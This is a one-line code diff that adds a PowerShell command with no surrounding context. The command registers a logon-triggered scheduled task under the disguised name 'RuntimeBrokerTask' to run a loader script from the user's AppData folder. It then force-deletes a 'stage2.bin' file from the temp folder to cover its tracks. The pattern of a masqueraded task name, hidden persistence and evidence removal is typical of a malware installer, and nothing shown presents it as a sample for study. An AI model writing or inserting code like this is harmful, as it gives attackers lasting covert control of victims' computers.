@@ -1,0 +1,1 @@
+$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "powershell.exe -NoP -File `"$env:APPDATA\loader.ps1`""; $TaskTrigger = New-ScheduledTaskTrigger -AtLogOn; Register-ScheduledTask -TaskName 'RuntimeBrokerTask' -Action $TaskAction -Trigger $TaskTrigger -Force; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
